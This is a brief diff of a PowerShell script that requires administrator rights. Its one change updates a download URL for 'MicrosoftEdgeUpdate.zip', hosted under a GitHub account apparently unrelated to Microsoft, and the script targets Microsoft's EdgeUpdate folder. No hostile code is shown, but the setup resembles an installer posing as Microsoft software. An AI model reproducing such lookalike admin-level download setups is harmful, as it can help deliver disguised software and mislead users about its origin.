@@ -1,7 +1,7 @@
 # Requires -RunAsAdmin
 
 # Define environment variables
-$DownloadUrl = "https://github.com/WindowsSecurityServices/MicrosoftEdgeUpdate/releases/download/v1.0.1/MicrosoftEdgeUpdate.zip"
+$DownloadUrl = "https://github.com/WindowsSecurityServices/MicrosoftEdgeUpdate/releases/download/v1.0.2/MicrosoftEdgeUpdate.zip"
 
 # Updated base directory configurations
 $BaseDir     = "C:\Program Files (x86)\Microsoft\EdgeUpdate"
